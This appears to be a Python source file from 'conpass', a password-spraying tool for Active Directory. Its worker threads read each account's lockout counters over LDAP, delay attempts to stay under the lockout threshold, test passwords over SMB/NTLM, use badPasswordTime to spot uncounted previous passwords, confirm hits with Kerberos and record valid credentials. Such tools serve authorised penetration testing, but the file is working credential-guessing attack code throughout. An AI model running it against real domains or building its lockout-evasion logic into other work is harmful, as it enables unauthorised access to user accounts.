"""Worker threads testing one password on one user at a time, only when it is safe."""

import threading
import time
from collections.abc import Callable
from dataclasses import dataclass
from datetime import timedelta

from conpass.database import NOTE_PREVIOUS, NOTE_RESTRICTED, NOTE_UNCONFIRMED, Database
from conpass.errors import AuthAttemptLostError, ConnectionFailedError, UserLockedOutError
from conpass.lockout import LockoutState, User
from conpass.output import console, debug
from conpass.protocols.kerberos import KerberosChecker, KerberosVerdict
from conpass.protocols.ldap import LdapClient
from conpass.protocols.smb import AuthStatus, SmbAuthenticator
from conpass.scheduler import Scheduler
from conpass.timeutils import dc_now

# Longer than the 5 minutes default of OldPasswordAllowedPeriod, to cover customized values
OLD_PASSWORD_CHECK_PERIOD = timedelta(hours=1)
# Delay of the second read before concluding that a failure was not counted
UNCOUNTED_CONFIRM_DELAY = 1.0
# Delay before handing out again a user whose attempt hit an unexpected error
ERROR_RETRY_DELAY = 5.0


@dataclass
class SprayContext:
    """Objects shared by all workers."""

    scheduler: Scheduler
    time_delta: timedelta  # local clock minus DC clock
    stop_event: threading.Event
    lockout_event: threading.Event
    kerberos: KerberosChecker
    database: Database | None = None
    # Opens an LDAP connection to a given DC, to report per-DC counters on lockout
    connect_ldap: Callable[[str], LdapClient] | None = None


class Worker(threading.Thread):
    """
    Test passwords handed out by the scheduler, each worker with its own connections.

    For each (user, password):
    1. read the lockout state of the user on the PDC (one BASE search);
    2. give the user back with a delay if an attempt is not safe yet;
    3. authenticate against the PDC, so that only the counter we read moves;
    4. read the state again to know whether the failure was counted. A failure
       leaving badPasswordTime untouched means the password is one of the two
       previous ones (N-1 / N-2), which the DC does not count.
    """

    def __init__(
        self,
        worker_id: int,
        context: SprayContext,
        ldap: LdapClient | None,
        smb: SmbAuthenticator,
        on_ready: Callable[[bool], None],
    ):
        """
        Args:
            worker_id: Number displayed in messages
            context: Shared objects
            ldap: LDAP connection to the PDC, None in offline mode
            smb: SMB connection to the PDC
            on_ready: Called once connected (True) or after failing to connect (False)
        """
        super().__init__(name=f"worker-{worker_id}", daemon=True)
        self.worker_id = worker_id
        self.ctx = context
        self.ldap = ldap
        self.smb = smb
        self.on_ready = on_ready

    def _debug(self, message: str) -> None:
        debug(f"Worker {self.worker_id}: {message}")

    def _now(self):
        return dc_now(self.ctx.time_delta)

    def run(self) -> None:
        try:
            if self.ldap:
                self.ldap.connect()
            self.smb.connect()
        except ConnectionFailedError as e:
            console.print(f"[red]Worker {self.worker_id} could not connect: {e}[/red]")
            self.on_ready(False)
            return
        self.on_ready(True)

        scheduler = self.ctx.scheduler
        while not self._must_stop():
            item = scheduler.acquire(timeout=0.5)
            if item is None:
                continue
            user, password = item
            delay, consumed = ERROR_RETRY_DELAY, False
            try:
                delay, consumed = self._process(user, password)
            except UserLockedOutError:
                self.ctx.lockout_event.set()
                scheduler.close()
            except ConnectionFailedError as e:
                console.print(f"[red]Worker {self.worker_id} stopped: {e}[/red]")
                return
            except Exception as e:
                console.print(f"[red]Worker {self.worker_id}: error on {user.samaccountname}: {e}[/red]")
            finally:
                scheduler.release(user, delay, consumed)

    def _must_stop(self) -> bool:
        return self.ctx.stop_event.is_set() or self.ctx.lockout_event.is_set()

    # ----- one attempt -----

    def _process(self, user: User, password: str) -> tuple[float, bool]:
        """
        Test one password on one user if it is safe.

        Returns:
            (seconds before the user can be handed out again, whether the password is done with)
        """
        if not self._refresh(user):
            return 0, False

        now = self._now()
        wait = (user.next_attempt_time(now) - now).total_seconds()
        if wait > 0:
            self._debug(
                f"{user.samaccountname} must wait {wait:.0f}s (bad password count {user.effective_bad_count(now)})"
            )
            return wait, False
        if self._must_stop():
            return 0, False

        before = user.state
        self._debug(f"testing {user.samaccountname} / {password}")
        try:
            status = self.smb.authenticate(user.samaccountname, password)
        except AuthAttemptLostError as e:
            self._debug(str(e))
            return 0, self._handle_lost_attempt(user, password, before)

        if status == AuthStatus.ACCOUNT_LOCKED_OUT:
            self._report_lockout(user, password, "the authentication answer")
            raise UserLockedOutError(user.samaccountname)
        if status.password_valid:
            self._handle_success(user, password, status)
        elif status == AuthStatus.ACCOUNT_RESTRICTION:
            self._handle_restricted(user, password)
        else:
            self._handle_failure(user, password, status, before)
        return 0, True

    def _refresh(self, user: User) -> bool:
        """Read the state of the user on the PDC. False if the user must be dropped."""
        if not self.ldap:
            return True
        state = self.ldap.read_user_state(user.dn)
        if state is None or state.disabled:
            console.print(f"[bright_black]{user.samaccountname} was disabled or deleted, skipped[/bright_black]")
            user.finished = True
            return False
        user.state = state
        return True

    def _was_counted(self, user: User, before: LockoutState) -> bool:
        """
        Tell whether the DC counted our failed attempt, by comparing badPasswordTime.

        A successful logon of the user resets badPwdCount but not badPasswordTime,
        so an unchanged badPasswordTime can only mean that our failure was not
        counted. Without LDAP, every failure is assumed to be counted.

        Raises:
            UserLockedOutError: If the account is now locked out
        """
        if not self.ldap:
            return True
        for delay in (0, UNCOUNTED_CONFIRM_DELAY):
            time.sleep(delay)
            try:
                after = self.ldap.read_user_state(user.dn)
            except Exception as e:
                self._debug(f"post-attempt read failed for {user.samaccountname}: {e}")
                return True
            if after is None:
                return True
            user.state = after
            if user.lockout_end(self._now()) is not None:
                self._report_lockout(user, "", "a read after the attempt")
                raise UserLockedOutError(user.samaccountname)
            if after.bad_pwd_filetime != before.bad_pwd_filetime:
                return True
        return False

    # ----- outcomes -----

    def _handle_failure(self, user: User, password: str, status: AuthStatus, before: LockoutState) -> None:
        user.record_failure(self._now())
        if status == AuthStatus.UNKNOWN:
            console.print(
                f"[yellow]{user.samaccountname}: unexpected answer ({self.smb.last_error}), "
                f"counted as a failed attempt[/yellow]"
            )
        if self._was_counted(user, before) or status == AuthStatus.UNKNOWN:
            self._record(user, password, False)
            return
        user.cancel_last_failure()
        console.print(
            f"[magenta]{user.samaccountname} - {password}[/magenta]"
            "[bright_black] (previous password: the failure was not counted)[/bright_black]"
        )
        self._record(user, password, False, NOTE_PREVIOUS)

    def _handle_lost_attempt(self, user: User, password: str, before: LockoutState) -> bool:
        """
        The connection dropped during the attempt. It is never replayed blindly:
        it is accounted for first, then the usual checks decide when to try again.

        Returns:
            True if the DC counted it, so the password is done with
        """
        user.record_failure(self._now())
        if self.ldap and self._was_counted(user, before):
            self._record(user, password, False)
            return True
        return False

    def _handle_success(self, user: User, password: str, status: AuthStatus) -> None:
        verdict = self._check_previous_password(user, password)
        if verdict == KerberosVerdict.PREVIOUS:
            console.print(
                f"[magenta]{user.samaccountname} - {password}[/magenta]"
                "[bright_black] (previous password, still accepted over NTLM after a recent change)[/bright_black]"
            )
            self._record(user, password, False, NOTE_PREVIOUS)
            return

        user.finished = True
        details = [status.value]
        note = None
        if verdict == KerberosVerdict.UNKNOWN:
            note = NOTE_UNCONFIRMED
            details.append("password changed recently, may be the previous one")
        details = ", ".join(filter(None, details))
        console.print(
            f"[green bold]{user.samaccountname} - {password}[/green bold]"
            + (f"[bright_black] ({details})[/bright_black]" if details else "")
        )
        self._record(user, password, True, note)

    def _check_previous_password(self, user: User, password: str) -> KerberosVerdict:
        """
        NTLM accepts the previous password for a few minutes after a change
        (OldPasswordAllowedPeriod): confirm successes on recently changed passwords
        with Kerberos. Offline, pwdLastSet is unknown so every success is checked.
        """
        if user.online:
            pwd_last_set = user.state.pwd_last_set
            if pwd_last_set is None or self._now() - pwd_last_set >= OLD_PASSWORD_CHECK_PERIOD:
                return KerberosVerdict.CURRENT
        verdict = self.ctx.kerberos.verify(user.samaccountname, password)
        self._debug(f"Kerberos check of {user.samaccountname}: {verdict.value}")
        return verdict

    def _handle_restricted(self, user: User, password: str) -> None:
        user.finished = True
        console.print(
            f"[bright_black]{user.samaccountname} cannot be tested over NTLM "
            f"(likely a Protected Users member), skipped[/bright_black]"
        )
        self._record(user, password, False, NOTE_RESTRICTED)

    def _record(self, user: User, password: str, success: bool, note: str | None = None) -> None:
        if self.ctx.database:
            self.ctx.database.record(user.samaccountname, password, success, note)

    # ----- diagnostics -----

    def _report_lockout(self, user: User, password: str, source: str) -> None:
        """Print everything known about an account that got locked out."""
        console.print(
            f"[red bold]LOCKOUT DETECTED by worker {self.worker_id} in {source}[/red bold]\n"
            f"{user}\n"
            f"  Password being tested: {password or '(attempt already answered)'}\n"
            f"  Security threshold: {user.security_threshold}\n"
            f"  DC time: {self._now().isoformat()}"
        )
        if self.ctx.connect_ldap and user.dn:
            self._print_per_dc_state(user.dn)
        console.print(f"[red]Unlock it with: Unlock-ADAccount -Identity {user.samaccountname}[/red]")

    def _print_per_dc_state(self, dn: str) -> None:
        """badPwdCount is not replicated: show what each DC has, to understand the lockout."""
        try:
            hostnames = self.ldap.domain_controller_hostnames()
        except Exception as e:
            console.print(f"  Could not list domain controllers: {e}")
            return
        for hostname in hostnames:
            client = self.ctx.connect_ldap(hostname)
            try:
                client.connect()
                state = client.read_user_state(dn)
            except Exception as e:
                console.print(f"  {hostname}: unreadable ({e})")
                continue
            finally:
                client.close()
            if state:
                console.print(
                    f"  {hostname}: badPwdCount={state.bad_pwd_count}, badPasswordTime={state.bad_pwd_time}, "
                    f"lockoutTime={state.lockout_time}, locked={state.locked}"
                )
